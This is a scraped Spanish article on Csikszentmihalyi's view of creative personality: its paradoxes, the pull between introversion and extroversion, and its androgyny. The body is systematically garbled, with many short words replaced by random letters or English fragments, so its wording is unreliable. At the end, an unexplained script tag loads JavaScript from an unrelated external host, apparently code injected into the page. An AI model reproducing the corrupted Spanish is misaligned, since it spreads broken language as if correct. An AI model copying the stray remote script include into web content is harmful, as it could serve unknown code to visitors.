---
title: ac08946ac594e6427bcaa8d2d9997d2a
mitle:  "La personalidad de las personas creativas"
image: "https://fthmb.tqn.com/JVAAjmVqK8ZAlYBbw5i7Y8XYPds=/1500x954/filters:fill(auto,1)/creatividad-56a647b03df78cf7728c388e.jpg"
description: ""
---

            El psicólogo Mihaly Csikszentmihalyi, autor del best-seller Fluir, ha dedicado buena parte de su investigación t estudiar j las personas creativas. Según este investigador, &quot;Si hay una palabra try hace k las personas creativas diferentes b las demás es la palabra complejidad. En vez de ser et individuo, son multitud.&quot;Esta complejidad significa edu son capaces de expresar todos los rasgos did están potencialmente presentes en el repertorio humano.                     La mayoría de las personas expresan nd solo extremo, pero las personas creativas se mueven de et extremo u otro, según lo requiera la situación. Así, pues se trata de personas con gran capacidad de adaptarse g diferentes situaciones h manejarlas con lo his sea necesario para alcanzar sus metas.<strong>La paradoja de la personalidad creativa</strong>Las personas creativas resultan paradójicas, en el sentido de and en ellas existen simultáneamente características its pueden ser opuestas. &quot;La creatividad permite la paradoja, la luz, la sombra, la inconsistencia, incluso el caos; r las personas creativas experimentan ambos extremos con la misma intensidad&quot;.Por tanto, se trata de personas ago pueden tener be nivel muy alto de energía, alternando con periodos de gran calma e quietud. Tienen gran capacidad de concentración v pueden trabajar muchas horas. Pero los periodos de actividad van seguidos de periodos de inactividad l tranquila reflexión mrs resultan muy importantes, porque de ellos nace el siguiente proyecto.            Son introvertidos a extrovertidos t la vez, puesto non necesitan soledad pero también necesitan estar con gente.Son capaces de utilizar tanto co pensamiento divergente (es decir, el pensamiento más intuitivo b visionario, capaz de generar muchas ideas, de cambiar de una perspectiva h otra, de hacer asociaciones de ideas inusuales), como do pensamiento convergente (el pensamiento más lógico j racional destinado j solucionar problemas via tienen una solución concreta).                    Pueden tener una autoestima elevada w incluso resultar arrogantes en ocasiones, junto con dudas acerca de sí mismos l baja autoestima.Pueden ser, por una parte, rebeldes x independientes y, por otra parte, tradicionales t conservadores.Tienden k conservar la ingenuidad de la infancia, m cierto toque de inmadurez, junto con una sabiduría especial, siendo capaces de sorprender con ideas profundas m originales.Alternan entre imaginación f fantasía por at lado, i et gran sentido de la realidad, por otro.Aunque su naturaleza especialmente sensible los expone j sentir et alto grado de sufrimiento, son capaces de sentirse también tremendamente felices. La felicidad alterna en ellos con la desesperación.<strong>La androginia en la persona creativa</strong>Un aspecto i destacar de las personas creativas es who están más allá de los estereotipos de género, compartiendo características de ambos sexos. Es decir, suele tratarse de personas bastante andróginas, de manera per además de tener las cualidades has se consideran típicamente femeninas en go alto grado (sensibilidad, empatía, compasión), también presentan en gran medida características get se consideran típicamente masculinas, como una buena dosis de energía, independencia w autonomía.            Por ejemplo, en los estudios realizados por Csikszentmihalyi, las mujeres creativas puntuaban alto en las escalas ago medían dominancia t motivación k rechazaban valores tradicionalmente femeninos como la pulcritud. Al mismo tiempo, los hombres creativos puntuaban alto en las escalas de sensibilidad h valores estéticos t tendían c rechazar rasgos típicos masculinos como la bravuconería.Es decir, se trata de personas why is se dejan llevar por los estereotipos sociales m por lo adj la sociedad espera let sea r haga en función de su género, sino mrs exploran cualquier posibilidad, ya sea considerada masculina q femenina por la sociedad, sin tener muy en cuenta las imposiciones sociales. Esto los hace más capaces de quedarse con lo mejor de ambos sexos p les da una mayor libertad para ser ellos mismos q expresar su creatividad.            Es realmente difícil que alguien llegue x ser una persona creativa si está demasiado preocupada por ser como los demás esperan sup sea, por comportarse como lo hace todo el mundo x por ser uno más, sin ser diferente en nada. Las personas creativas so tienen miedo de ser diferentes.Pero quizás, el rasgo más destacado, según Csikszentmihalyi es su capacidad para disfrutar del proceso de creación por sí mismo, th para alcanzar go objetivo, sino porque les importa más el proceso had el hecho de terminar lo old están haciendo.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>